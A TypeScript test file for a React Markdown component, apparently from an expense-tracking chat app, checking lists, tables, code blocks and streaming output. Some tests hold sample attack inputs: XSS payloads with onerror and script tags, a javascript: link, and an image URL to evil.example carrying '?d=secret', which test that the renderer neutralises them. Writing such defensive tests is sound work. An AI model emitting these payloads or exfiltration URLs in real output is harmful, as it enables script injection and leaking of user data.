import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { Markdown } from "@/components/ui/Markdown";

const md = (text: string, streaming = false) => render(<Markdown text={text} streaming={streaming} />).container;

describe("Markdown", () => {
  it("renders Main's card: the sentence after the bullets is its own paragraph", () => {
    const box = md("A change to expenses (now v0.1.0):\n- `add` takes a category\n- `summary` totals per category\nIt keeps its data.");
    const items = screen.getAllByRole("listitem");
    expect(items.map((li) => li.textContent)).toEqual(["add takes a category", "summary totals per category"]);
    expect(within(items[0]).getByText("add").tagName).toBe("CODE");
    expect([...box.querySelectorAll("p")].map((p) => p.textContent)).toEqual(["A change to expenses (now v0.1.0):", "It keeps its data."]);
  });

  it("keeps a line break a line break, and a range a range", () => {
    const box = md("Coffee 85\nLunch 120\nopen 20~25 Dec");
    expect(box.querySelectorAll("br")).toHaveLength(2);
    expect(box.querySelector("del")).toBeNull();
  });

  it("renders GitHub tables, task lists and emphasis", () => {
    const box = md("**Total** 205\n\n| day | spent |\n|---|---:|\n| Mon | 85 |\n\n- [x] coffee\n- [ ] lunch");
    expect(screen.getByText("Total").tagName).toBe("STRONG");
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getAllByRole("cell").map((c) => c.textContent)).toEqual(["Mon", "85"]);
    const boxes = screen.getAllByRole("checkbox");
    expect(boxes.map((b) => (b as HTMLInputElement).checked)).toEqual([true, false]);
    expect(box.querySelector("ul")).toHaveClass("list-none");
  });

  it("shows raw HTML as text, never as elements", () => {
    const box = md('hi <img src="x" onerror="alert(1)"> <script>alert(2)</script>');
    expect(box.querySelector("img, script")).toBeNull();
    expect(box.textContent).toContain('<img src="x" onerror="alert(1)">');
  });

  it("opens links in a new tab without a referrer, and drops a scheme it does not follow", () => {
    md("[docs](https://example.com/a) and [click](javascript:alert(1))");
    const link = screen.getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("href", "https://example.com/a");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noreferrer");
    expect(screen.queryByRole("link", { name: "click" })).toBeNull();
    expect(screen.getByText("click")).toBeInTheDocument();
  });

  it("never loads an image: it is a link to it", () => {
    const box = md("![chart](https://evil.example/p.png?d=secret)");
    expect(box.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "chart" })).toHaveAttribute("href", "https://evil.example/p.png?d=secret");
  });

  it("puts code in a block with its language and a copy button", async () => {
    const user = userEvent.setup();
    const writeText = vi.spyOn(navigator.clipboard, "writeText").mockResolvedValue();
    const box = md("```json\n{\"amount\": 85}\n```");
    const block = box.querySelector("[data-kind=code]")!;
    expect(within(block as HTMLElement).getByText("json")).toBeInTheDocument();
    expect(block.querySelector("pre code")?.textContent).toBe('{"amount": 85}');
    await user.click(screen.getByRole("button", { name: "Copy code" }));
    expect(writeText).toHaveBeenCalledWith('{"amount": 85}');
    expect(await screen.findByRole("button", { name: "Copied" })).toBeInTheDocument();
  });

  it("while a reply is being written: open marks are closed and the caret follows the last word", () => {
    const box = md("Spent **85 on cof", true);
    expect(screen.getByText(/85 on cof/).tagName).toBe("STRONG");
    expect(box.querySelector("p [data-caret]")).not.toBeNull();
    const half = md("see [the docs](https://exa", true);
    expect(half.querySelector("a")).toBeNull();
    expect(md("done").querySelector("[data-caret]")).toBeNull();
  });
});
